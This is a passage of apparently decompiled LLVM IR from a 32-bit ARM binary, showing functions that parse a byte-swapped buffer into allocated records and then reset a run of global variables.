dec_label_pc_a03c.preheader:                      ; preds = %dec_label_pc_a00c
  %v1_a020 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a03c

dec_label_pc_a02c:                                ; preds = %dec_label_pc_a03c
  %v4_a02c = mul i32 %v1_a03c, 4
  %v5_a02c = add i32 %v4_a02c, %v2_a010
  %v6_a02c = inttoptr i32 %v5_a02c to i32*
  %v7_a02c = load i32, i32* %v6_a02c, align 4
  store i32 %v7_a02c, i32* @ip, align 4
  %v1_a030 = add i32 %v7_a02c, 4
  %v2_a030 = inttoptr i32 %v1_a030 to i8*
  %v3_a030 = load i8, i8* %v2_a030, align 1
  %v4_a030 = zext i8 %v3_a030 to i32
  %v9_a034 = icmp eq i32 %v4_a030, %v1_a01c
  br i1 %v9_a034, label %dec_label_pc_a050, label %dec_label_pc_a03c

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a03c.preheader, %dec_label_pc_a02c
  %v0_a03c = phi i32 [ %v1_a020, %dec_label_pc_a03c.preheader ], [ %v1_a03c, %dec_label_pc_a02c ]
  %v1_a03c = add i32 %v0_a03c, 1
  %v9_a040 = icmp eq i32 %v1_a03c, %v3_a000
  br i1 %v9_a040, label %dec_label_pc_a048, label %dec_label_pc_a02c

dec_label_pc_a048:                                ; preds = %dec_label_pc_a03c, %dec_label_pc_9ffc, %dec_label_pc_a050
  %v1_a04c = call i32 @function_15194(i32 0)
  %v0_a060.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a02c, %dec_label_pc_a00c, %dec_label_pc_a048
  %v0_a060 = phi i32 [ %v2_a014, %dec_label_pc_a00c ], [ %v0_a060.pre, %dec_label_pc_a048 ], [ %v7_a02c, %dec_label_pc_a02c ]
  %v1_a060 = inttoptr i32 %v0_a060 to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  store i32 %v2_a060, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_a060)
  br label %dec_label_pc_a048

; uselistorder directives
  uselistorder i32 %v1_a03c, { 2, 0, 1 }
  uselistorder i32 %v0_9fc0, { 1, 2, 0 }
  uselistorder i1 %v7_9f98, { 1, 0 }
  uselistorder i32 %v0_9f94, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_a050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a048, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a03c, { 1, 0 }
  uselistorder label %dec_label_pc_9ffc, { 1, 0 }
  uselistorder label %dec_label_pc_9ff4, { 1, 0 }
  uselistorder label %dec_label_pc_9fb8, { 1, 0 }
}

define i32 @function_a078(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_a078:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_a07c = icmp ugt i32 %arg2, 2
  %v7_a07c = icmp eq i32 %arg2, 3
  store i1 %v7_a07c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a088 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a088, i32* @r5, align 4
  %v2_a08c = xor i1 %v7_a07c, true
  %v3_a08c = and i1 %v2_a07c, %v2_a08c
  br i1 %v3_a08c, label %dec_label_pc_a09c, label %dec_label_pc_a090

dec_label_pc_a090:                                ; preds = %dec_label_pc_a0dc, %.dec_label_pc_a090_crit_edge, %dec_label_pc_a0d0, %dec_label_pc_a0c0, %dec_label_pc_a09c, %dec_label_pc_a078, %dec_label_pc_a288
  %v1_a098 = phi i32 [ %v1_a098.pre, %.dec_label_pc_a090_crit_edge ], [ %v1_a0a0, %dec_label_pc_a0dc ], [ %v1_a0a0, %dec_label_pc_a0d0 ], [ %v1_a0a0, %dec_label_pc_a0c0 ], [ %v1_a0a0, %dec_label_pc_a09c ], [ %v0_a088, %dec_label_pc_a078 ], [ %v0_a28c, %dec_label_pc_a288 ]
  ret i32 %v1_a098

dec_label_pc_a09c:                                ; preds = %dec_label_pc_a078
  %v1_a09c = inttoptr i32 %v0_a088 to i32*
  %v2_a09c = load i32, i32* %v1_a09c, align 4
  store i32 %v2_a09c, i32* %r1.global-to-local, align 4
  %v1_a0a0 = and i32 %v2_a09c, 16711680
  store i32 %v1_a0a0, i32* %r0.global-to-local, align 4
  %v3_a0a4 = udiv i32 %v2_a09c, 16777216
  %v4_a0a8 = udiv i32 %v1_a0a0, 256
  %v5_a0a8 = or i32 %v4_a0a8, %v3_a0a4
  %v1_a0ac = and i32 %v2_a09c, 65280
  store i32 %v1_a0ac, i32* %r2.global-to-local, align 4
  %v4_a0b0 = mul nuw nsw i32 %v1_a0ac, 256
  %v5_a0b0 = or i32 %v5_a0a8, %v4_a0b0
  store i32 %v5_a0b0, i32* %r3.global-to-local, align 4
  %v7_a0b4 = icmp eq i32 %arg2, 4
  store i1 %v7_a0b4, i1* %cpsr_z.global-to-local, align 1
  %v5_a0b8 = call i32 @llvm.bswap.i32(i32 %v2_a09c)
  store i32 %v5_a0b8, i32* @fp, align 4
  br i1 %v7_a0b4, label %dec_label_pc_a090, label %dec_label_pc_a0c0

dec_label_pc_a0c0:                                ; preds = %dec_label_pc_a09c
  %v1_a0c0 = add i32 %v0_a088, 4
  %v2_a0c0 = inttoptr i32 %v1_a0c0 to i8*
  %v3_a0c0 = load i8, i8* %v2_a0c0, align 1
  %v4_a0c0 = zext i8 %v3_a0c0 to i32
  store i32 %v4_a0c0, i32* %r2.global-to-local, align 4
  %v7_a0c4 = icmp eq i32 %arg2, 5
  store i1 %v7_a0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0c4, label %dec_label_pc_a090, label %dec_label_pc_a0d0

dec_label_pc_a0d0:                                ; preds = %dec_label_pc_a0c0
  %v1_a0d0 = add i32 %v0_a088, 5
  %v2_a0d0 = inttoptr i32 %v1_a0d0 to i8*
  %v3_a0d0 = load i8, i8* %v2_a0d0, align 1
  %v4_a0d0 = zext i8 %v3_a0d0 to i32
  store i32 %v4_a0d0, i32* @sb, align 4
  %v2_a0d4 = icmp eq i8 %v3_a0d0, 0
  store i1 %v2_a0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0d4, label %dec_label_pc_a090, label %dec_label_pc_a0dc

dec_label_pc_a0dc:                                ; preds = %dec_label_pc_a0d0
  %v2_a0e0 = mul nuw nsw i32 %v4_a0d0, 5
  store i32 %v2_a0e0, i32* @r7, align 4
  %v1_a0e4 = add i32 %arg2, -6
  store i32 %v1_a0e4, i32* %r3.global-to-local, align 4
  %v3_a0e8 = icmp ult i32 %v1_a0e4, %v2_a0e0
  %v9_a0e8 = icmp eq i32 %v1_a0e4, %v2_a0e0
  store i1 %v9_a0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a0e8, label %dec_label_pc_a090, label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_a0dc
  store i32 %v4_a0d0, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a0e4, i32* @r6, align 4
  %v2_a0fc = call i32 @function_144a8(i32 %v4_a0d0, i32 24)
  store i32 %v2_a0fc, i32* @ip, align 4
  %v0_a108 = load i32, i32* @r7, align 4
  %v1_a108 = load i32, i32* @r4, align 4
  %v2_a108 = sub i32 %v1_a108, %v0_a108
  store i32 %v2_a108, i32* @r7, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  %v1_a10c = add i32 %v0_a10c, 11
  store i32 %v1_a10c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a110

dec_label_pc_a110:                                ; preds = %dec_label_pc_a110, %dec_label_pc_a0f0
  %v1_a114 = phi i32 [ %v1_a140, %dec_label_pc_a110 ], [ %v2_a0fc, %dec_label_pc_a0f0 ]
  %v0_a110 = phi i32 [ %v1_a13c, %dec_label_pc_a110 ], [ %v1_a10c, %dec_label_pc_a0f0 ]
  %v1_a110 = add i32 %v0_a110, -5
  %v2_a110 = inttoptr i32 %v1_a110 to i32*
  %v3_a110 = load i32, i32* %v2_a110, align 4
  store i32 %v3_a110, i32* %r1.global-to-local, align 4
  %v2_a114 = add i32 %v1_a114, 16
  %v3_a114 = inttoptr i32 %v2_a114 to i32*
  store i32 %v3_a110, i32* %v3_a114, align 4
  %v0_a118 = load i32, i32* @r7, align 4
  %v1_a118 = add i32 %v0_a118, -6
  store i32 %v1_a118, i32* %r3.global-to-local, align 4
  %v0_a11c = load i32, i32* %r0.global-to-local, align 4
  %v1_a11c = add i32 %v0_a11c, -1
  %v2_a11c = inttoptr i32 %v1_a11c to i8*
  %v3_a11c = load i8, i8* %v2_a11c, align 1
  %v4_a11c = zext i8 %v3_a11c to i32
  store i32 %v4_a11c, i32* %r2.global-to-local, align 4
  %v0_a120 = load i32, i32* @r6, align 4
  %v1_a120 = add i32 %v0_a120, -5
  store i32 %v1_a120, i32* @r6, align 4
  %v9_a124 = icmp eq i32 %v1_a120, %v1_a118
  store i1 %v9_a124, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_a11c, i32* @r4, align 4
  %v2_a130 = load i32, i32* @ip, align 4
  %v3_a130 = add i32 %v2_a130, 20
  %v4_a130 = inttoptr i32 %v3_a130 to i8*
  store i8 %v3_a11c, i8* %v4_a130, align 1
  %v0_a134 = load i32, i32* %r1.global-to-local, align 4
  %v1_a134 = load i32, i32* @ip, align 4
  %v2_a134 = add i32 %v1_a134, 4
  %v3_a134 = inttoptr i32 %v2_a134 to i32*
  store i32 %v0_a134, i32* %v3_a134, align 4
  %v0_a138 = load i32, i32* %r3.global-to-local, align 4
  %v1_a138 = trunc i32 %v0_a138 to i16
  %v2_a138 = load i32, i32* @ip, align 4
  %v3_a138 = inttoptr i32 %v2_a138 to i16*
  store i16 %v1_a138, i16* %v3_a138, align 2
  %v0_a13c = load i32, i32* %r0.global-to-local, align 4
  %v1_a13c = add i32 %v0_a13c, 5
  store i32 %v1_a13c, i32* %r0.global-to-local, align 4
  %v0_a140 = load i32, i32* @ip, align 4
  %v1_a140 = add i32 %v0_a140, 24
  store i32 %v1_a140, i32* @ip, align 4
  %v0_a144 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a144, label %dec_label_pc_a148, label %dec_label_pc_a110

dec_label_pc_a148:                                ; preds = %dec_label_pc_a110
  %v0_a148 = load i32, i32* @r6, align 4
  %v2_a148 = icmp eq i32 %v0_a148, 0
  store i1 %v2_a148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a148, label %dec_label_pc_a24c, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a148
  %v0_a150 = load i32, i32* @r4, align 4
  %v1_a150 = inttoptr i32 %v0_a150 to i8*
  %v2_a150 = load i8, i8* %v1_a150, align 1
  %v3_a150 = zext i8 %v2_a150 to i32
  store i32 %v3_a150, i32* @r5, align 4
  %v2_a154 = icmp eq i8 %v2_a150, 0
  store i1 %v2_a154, i1* %cpsr_z.global-to-local, align 1
  %v0_a158 = load i32, i32* @r7, align 4
  %v1_a158 = add i32 %v0_a158, -7
  store i32 %v1_a158, i32* @r8, align 4
  br i1 %v2_a154, label %bb, label %dec_label_pc_a164

bb:                                               ; preds = %dec_label_pc_a150
  store i32 %v3_a150, i32* @r6, align 4
  br label %dec_label_pc_a228

dec_label_pc_a164:                                ; preds = %dec_label_pc_a150
  store i32 %v3_a150, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a16c = call i32 @function_144a8(i32 %v3_a150, i32 8)
  store i32 %v2_a16c, i32* %r0.global-to-local, align 4
  %v0_a170 = load i32, i32* @r8, align 4
  %v2_a170 = icmp eq i32 %v0_a170, 0
  store i1 %v2_a170, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a16c, i32* @r6, align 4
  br i1 %v2_a170, label %dec_label_pc_a24c, label %dec_label_pc_a17c

dec_label_pc_a17c:                                ; preds = %dec_label_pc_a164
  %v0_a17c = load i32, i32* @r4, align 4
  %v1_a17c = add i32 %v0_a17c, 1
  %v2_a17c = inttoptr i32 %v1_a17c to i8*
  %v3_a17c = load i8, i8* %v2_a17c, align 1
  %v0_a180 = load i32, i32* @r7, align 4
  %v7_a180 = icmp eq i32 %v0_a180, 8
  store i1 %v7_a180, i1* %cpsr_z.global-to-local, align 1
  %v3_a184 = add i32 %v2_a16c, 4
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v3_a17c, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* @r4, align 4
  %v1_a188 = add i32 %v0_a188, 1
  store i32 %v1_a188, i32* %r3.global-to-local, align 4
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %dec_label_pc_a24c, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a17c
  %v1_a190 = add i32 %v0_a188, 2
  %v2_a190 = inttoptr i32 %v1_a190 to i8*
  %v3_a190 = load i8, i8* %v2_a190, align 1
  %v4_a190 = zext i8 %v3_a190 to i32
  store i32 %v4_a190, i32* @r4, align 4
  %v0_a194 = load i32, i32* @r7, align 4
  %v1_a194 = add i32 %v0_a194, -9
  store i32 %v1_a194, i32* @r8, align 4
  %v9_a198 = icmp eq i32 %v1_a194, %v4_a190
  store i1 %v9_a198, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a190, i32* %r1.global-to-local, align 4
  %v5_a1a0 = icmp slt i32 %v1_a194, %v4_a190
  br i1 %v5_a1a0, label %dec_label_pc_a24c, label %bb35

bb35:                                             ; preds = %dec_label_pc_a190
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_a1a47 = add i32 %v0_a188, 3
  store i32 %v7_a1a47, i32* @r7, align 4
  %v6_a1a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1a8, i32* @sl, align 4
  br label %dec_label_pc_a1ec

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1ec
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = load i32, i32* @r4, align 4
  %v2_a1b8 = sub i32 %v0_a1b8, %v1_a1b8
  store i32 %v2_a1b8, i32* %r2.global-to-local, align 4
  %v9_a1b8 = icmp eq i32 %v0_a1b8, %v1_a1b8
  store i1 %v9_a1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1b8, label %dec_label_pc_a24c, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a1b8
  %v1_a1c0 = load i32, i32* @r7, align 4
  %v2_a1c0 = add i32 %v1_a1c0, %v1_a1b8
  %v3_a1c0 = inttoptr i32 %v2_a1c0 to i8*
  %v4_a1c0 = load i8, i8* %v3_a1c0, align 1
  store i32 %v2_a1c0, i32* %r0.global-to-local, align 4
  %v1_a1c8 = add i32 %v2_a1b8, -1
  store i32 %v1_a1c8, i32* %r2.global-to-local, align 4
  %v7_a1c8 = icmp eq i32 %v2_a1b8, 1
  store i1 %v7_a1c8, i1* %cpsr_z.global-to-local, align 1
  %v3_a1cc = add i32 %v2_a220, 4
  %v4_a1cc = inttoptr i32 %v3_a1cc to i8*
  store i8 %v4_a1c0, i8* %v4_a1cc, align 1
  %v0_a1d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1d0 = add i32 %v0_a1d0, 1
  store i32 %v1_a1d0, i32* %r3.global-to-local, align 4
  %v0_a1d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1d4 = add i32 %v0_a1d4, -1
  store i32 %v1_a1d4, i32* @r8, align 4
  %v1_a1d8 = add i32 %v0_a1d0, 2
  store i32 %v1_a1d8, i32* @r7, align 4
  %v0_a1dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1dc, label %dec_label_pc_a24c, label %dec_label_pc_a1e0

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1c0
  %v2_a1e0 = inttoptr i32 %v1_a1d0 to i8*
  %v3_a1e0 = load i8, i8* %v2_a1e0, align 1
  %v4_a1e0 = zext i8 %v3_a1e0 to i32
  store i32 %v4_a1e0, i32* @r4, align 4
  %v2_a1e4 = sub i32 %v1_a1d4, %v4_a1e0
  %tmp36 = sub i32 0, %v2_a1e4
  %v6_a1e4 = and i32 %v1_a1d4, %tmp36
  %v7_a1e4 = icmp slt i32 %v6_a1e4, 0
  %v8_a1e4 = icmp slt i32 %v2_a1e4, 0
  %v9_a1e4 = icmp eq i32 %v1_a1d4, %v4_a1e0
  store i1 %v9_a1e4, i1* %cpsr_z.global-to-local, align 1
  %v2_a1e8 = xor i1 %v8_a1e4, %v7_a1e4
  br i1 %v2_a1e8, label %dec_label_pc_a24c, label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %bb35, %dec_label_pc_a1e0
  %v0_a1f0 = phi i32 [ %v4_a190, %bb35 ], [ %v4_a1e0, %dec_label_pc_a1e0 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_a200, %dec_label_pc_a1e0 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a1f0 = add nuw nsw i32 %v0_a1f0, 1
  store i32 %v1_a1f0, i32* %r0.global-to-local, align 4
  %v2_a1f4 = call i32 @function_144a8(i32 %v1_a1f0, i32 1)
  store i32 %v2_a1f4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_a1fc = load i32, i32* @sl, align 4
  %v2_a1fc = inttoptr i32 %v1_a1fc to i32*
  store i32 %v2_a1f4, i32* %v2_a1fc, align 4
  %v0_a200 = load i32, i32* %r3.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, 1
  store i32 %v1_a200, i32* %r3.global-to-local, align 4
  %v0_a204 = load i32, i32* @r4, align 4
  store i32 %v0_a204, i32* %r2.global-to-local, align 4
  %v0_a208 = load i32, i32* @r7, align 4
  store i32 %v0_a208, i32* %r1.global-to-local, align 4
  %v3_a210 = call i32 @function_124f0(i32 %v2_a1f4, i32 %v0_a208, i32 %v0_a204)
  store i32 %v3_a210, i32* %r0.global-to-local, align 4
  store i32 %v1_a200, i32* %r2.global-to-local, align 4
  %v3_a218 = mul i32 %v1_a200, 8
  store i32 %v3_a218, i32* %r3.global-to-local, align 4
  %v1_a21c = load i32, i32* @r5, align 4
  %v9_a21c = icmp eq i32 %v1_a200, %v1_a21c
  store i1 %v9_a21c, i1* %cpsr_z.global-to-local, align 1
  %v0_a220 = load i32, i32* @r6, align 4
  %v2_a220 = add i32 %v0_a220, %v3_a218
  store i32 %v2_a220, i32* @sl, align 4
  br i1 %v9_a21c, label %dec_label_pc_a228, label %dec_label_pc_a1b8

dec_label_pc_a228:                                ; preds = %dec_label_pc_a1ec, %bb
  %v0_a228 = call i32 @function_13574()
  %v2_a230 = inttoptr i32 %v0_a228 to i32*
  store i32 0, i32* %v2_a230, align 4
  store i32 %v4_a0c0, i32* %r1.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  store i32 %v0_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @sb, align 4
  store i32 %v0_a23c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0fc, i32* %r3.global-to-local, align 4
  %v2_a244 = load i32, i32* @r5, align 4
  %v5_a244 = load i32, i32* @r6, align 4
  %v6_a248 = trunc i32 %v2_a244 to i8
  %v7_a248 = call i32 @function_9f7c(i32 %v0_a238, i32 %v4_a0c0, i32 %v0_a23c, i32 %v2_a0fc, i8 %v6_a248, i32 %v5_a244)
  store i32 %v7_a248, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a24c

dec_label_pc_a24c:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a1c0, %dec_label_pc_a1b8, %dec_label_pc_a190, %dec_label_pc_a17c, %dec_label_pc_a164, %dec_label_pc_a148, %dec_label_pc_a228
  store i32 %v2_a0fc, i32* %r3.global-to-local, align 4
  %v2_a250 = icmp eq i32 %v2_a0fc, 0
  store i1 %v2_a250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a250, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_a24c
  store i32 %v2_a0fc, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_a24c, %bb37
  store i32 41564, i32* @lr, align 4
  %v1_a258 = xor i1 %v2_a250, true
  call void @__pseudo_cond_branch(i1 %v1_a258, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_a25c = load i32, i32* @r6, align 4
  %v2_a25c = icmp eq i32 %v0_a25c, 0
  store i1 %v2_a25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a25c, label %.dec_label_pc_a090_crit_edge, label %dec_label_pc_a264

.dec_label_pc_a090_crit_edge:                     ; preds = %bb38
  %v1_a098.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a090

dec_label_pc_a264:                                ; preds = %bb38
  %v0_a264 = load i32, i32* @r5, align 4
  %v2_a264 = icmp eq i32 %v0_a264, 0
  store i1 %v2_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a264, label %dec_label_pc_a288, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a264
  br label %dec_label_pc_a270

dec_label_pc_a270:                                ; preds = %dec_label_pc_a270, %dec_label_pc_a26c
  %v0_a278 = phi i32 [ 0, %dec_label_pc_a26c ], [ %v1_a280, %dec_label_pc_a270 ]
  %v0_a270 = phi i32 [ %v0_a25c, %dec_label_pc_a26c ], [ %v0_a288.pre, %dec_label_pc_a270 ]
  %v4_a270 = mul i32 %v0_a278, 8
  %v5_a270 = add i32 %v4_a270, %v0_a270
  %v6_a270 = inttoptr i32 %v5_a270 to i32*
  %v7_a270 = load i32, i32* %v6_a270, align 4
  store i32 %v7_a270, i32* %r0.global-to-local, align 4
  %v2_a274 = icmp eq i32 %v7_a270, 0
  store i1 %v2_a274, i1* %cpsr_z.global-to-local, align 1
  %v1_a278 = add i32 %v0_a278, 1
  store i32 %v1_a278, i32* @r4, align 4
  store i32 41600, i32* @lr, align 4
  %v1_a27c = xor i1 %v2_a274, true
  call void @__pseudo_cond_branch(i1 %v1_a27c, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_a280 = load i32, i32* @r5, align 4
  %v1_a280 = load i32, i32* @r4, align 4
  %v9_a280 = icmp eq i32 %v0_a280, %v1_a280
  store i1 %v9_a280, i1* %cpsr_z.global-to-local, align 1
  %v0_a288.pre = load i32, i32* @r6, align 4
  br i1 %v9_a280, label %dec_label_pc_a288, label %dec_label_pc_a270

dec_label_pc_a288:                                ; preds = %dec_label_pc_a270, %dec_label_pc_a264
  %v0_a288 = phi i32 [ %v0_a25c, %dec_label_pc_a264 ], [ %v0_a288.pre, %dec_label_pc_a270 ]
  store i32 %v0_a288, i32* @r0, align 4
  %v0_a28c = call i32 @function_14bf4()
  store i32 %v0_a28c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a090

; uselistorder directives
  uselistorder i32 %v0_a28c, { 1, 0 }
  uselistorder i32 %v1_a280, { 1, 0 }
  uselistorder i1 %v2_a250, { 0, 2, 1 }
  uselistorder i32 %v2_a220, { 1, 0 }
  uselistorder i32 %v3_a218, { 1, 0 }
  uselistorder i32 %v1_a200, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_a1e4, { 1, 0 }
  uselistorder i32 %v4_a1e0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a1d4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a150, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a140, { 1, 0 }
  uselistorder i32 %v1_a13c, { 1, 0 }
  uselistorder i32 %v2_a0fc, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_a0d0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a0a0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a09c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a088, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 20, 3, 21, 5, 19, 9, 8, 6, 7, 15, 16, 10, 11, 12, 13, 14, 17, 18, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_a24c, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_a090, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_a294(i32 %arg1) local_unnamed_addr {
dec_label_pc_a294:
  %r0.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_212f4.57 to i32), i32* @r4, align 4
  %v2_a29c = load i32, i32* @global_var_212f4.57, align 4
  store i32 %v2_a29c, i32* %r0.global-to-local, align 4
  %v2_a2a0 = icmp eq i32 %v2_a29c, 0
  br i1 %v2_a2a0, label %dec_label_pc_a2ac, label %dec_label_pc_a334

dec_label_pc_a2ac:                                ; preds = %dec_label_pc_a294
  %v3_a2ac = load i32, i32* @global_var_212f8.58, align 4
  store i32 %v3_a2ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_a2b4 = icmp eq i32 %v3_a2ac, 0
  store i32 0, i32* @global_var_212f4.57, align 4
  br i1 %v2_a2b4, label %dec_label_pc_a2c0, label %dec_label_pc_a350

dec_label_pc_a2c0:                                ; preds = %dec_label_pc_a334.dec_label_pc_a2c0_crit_edge, %dec_label_pc_a2ac
  %v0_a2c8 = phi i32 [ %v0_a2c8.pre, %dec_label_pc_a334.dec_label_pc_a2c0_crit_edge ], [ 0, %dec_label_pc_a2ac ]
  %v3_a2c0 = load i32, i32* @global_var_212fc.59, align 4
  store i32 %v3_a2c0, i32* %r0.global-to-local, align 4
  %v2_a2c4 = icmp eq i32 %v3_a2c0, 0
  store i32 %v0_a2c8, i32* @global_var_212f8.58, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a2d0, label %dec_label_pc_a368

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a2c0, %dec_label_pc_a350
  %v0_a2d8 = phi i32 [ %v0_a2c8, %dec_label_pc_a2c0 ], [ %v0_a360, %dec_label_pc_a350 ]
  %v3_a2d0 = load i32, i32* @global_var_21300.60, align 4
  store i32 %v3_a2d0, i32* %r0.global-to-local, align 4
  %v2_a2d4 = icmp eq i32 %v3_a2d0, 0
  store i32 %v0_a2d8, i32* @global_var_212fc.59, align 4
  br i1 %v2_a2d4, label %dec_label_pc_a2e0, label %dec_label_pc_a380

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2d0, %dec_label_pc_a368
  %v0_a2e8 = phi i32 [ %v0_a2d8, %dec_label_pc_a2d0 ], [ %v0_a378, %dec_label_pc_a368 ]
  %v3_a2e0 = load i32, i32* @global_var_21304.61, align 4
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v2_a2e4 = icmp eq i32 %v3_a2e0, 0
  store i32 %v0_a2e8, i32* @global_var_21300.60, align 4
  br i1 %v2_a2e4, label %dec_label_pc_a2f0, label %dec_label_pc_a398

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2e0, %dec_label_pc_a380
  %v0_a2f8 = phi i32 [ %v0_a2e8, %dec_label_pc_a2e0 ], [ %v0_a390, %dec_label_pc_a380 ]
  %v3_a2f0 = load i32, i32* @global_var_21308.62, align 4
  store i32 %v3_a2f0, i32* %r0.global-to-local, align 4
  %v2_a2f4 = icmp eq i32 %v3_a2f0, 0
  store i32 %v0_a2f8, i32* @global_var_21304.61, align 4
  br i1 %v2_a2f4, label %dec_label_pc_a300, label %dec_label_pc_a3b0

dec_label_pc_a300:                                ; preds = %dec_label_pc_a2f0, %dec_label_pc_a398
  %v0_a308 = phi i32 [ %v0_a2f8, %dec_label_pc_a2f0 ], [ %v0_a3a8, %dec_label_pc_a398 ]
  %v3_a300 = load i32, i32* @global_var_2130c.63, align 4
  store i32 %v3_a300, i32* %r0.global-to-local, align 4
  %v2_a304 = icmp eq i32 %v3_a300, 0
  store i32 %v0_a308, i32* @global_var_21308.62, align 4
  br i1 %v2_a304, label %dec_label_pc_a310, label %dec_label_pc_a3c8

dec_label_pc_a310:                                ; preds = %dec_label_pc_a300, %dec_label_pc_a3b0
  %v0_a318 = phi i32 [ %v0_a308, %dec_label_pc_a300 ], [ %v0_a3c0, %dec_label_pc_a3b0 ]
  %v3_a310 = load i32, i32* @global_var_21310.64, align 4
  store i32 %v3_a310, i32* @r0, align 4
  %v2_a314 = icmp eq i32 %v3_a310, 0
  store i32 %v0_a318, i32* @global_var_2130c.63, align 4
  br i1 %v2_a314, label %dec_label_pc_a320, label %dec_label_pc_a3e0

